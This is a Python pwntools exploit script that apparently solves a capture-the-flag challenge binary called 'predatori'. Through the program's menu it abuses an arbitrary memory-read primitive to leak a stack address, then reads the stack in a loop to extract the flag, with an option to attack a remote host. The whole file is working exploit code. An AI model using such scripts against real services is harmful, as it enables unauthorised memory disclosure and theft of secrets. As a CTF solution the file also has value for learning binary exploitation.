#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('predatori')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *rww+94
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def www(addr, val):
    io.sendline("2")
    io.send(p64(addr) + b'\x08')
    io.send(p64(val))


def rww(addr, lsb=True):
    io.sendline("1")
    if lsb:
        io.send(p8(addr))
    else:
        io.send(p64(addr))


def solve():
    rww(0x80, lsb=True)  
    io.recvuntil("richiesta...\n")
    #io.recvuntil("richiesta...\n")
    try:
        leak = u64(io.recvline()[0:6].ljust(8, b'\x00'))
        flag_stack = leak - 0x40 # + 0x20
        print(hex(flag_stack))
        rww(flag_stack, lsb=False)
        io.recvuntil("richiesta...\n")
        r = io.recvline()[:8]
        print(f"received: {r}")

        flag = b""
        charset = string.ascii_letters.encode() + string.digits.encode() + b'_&'

        if b" " not in r:
            if r[0] in charset:
                flag += r

        if len(flag) != 0:
            for i in range(8, 0x300, 8):
                rww(flag_stack+i, lsb=False)
                io.recvuntil("richiesta...\n")
                r = io.recvline()[:8]

                if r[0] in charset:
                    print(flag)
                    flag += r
        else:
            io.close()
    except Exception:
        io.close()
    # io.interactive()



def main():
    for i in range(0x20):
        init()
        solve()

if __name__ == '__main__':
    main()
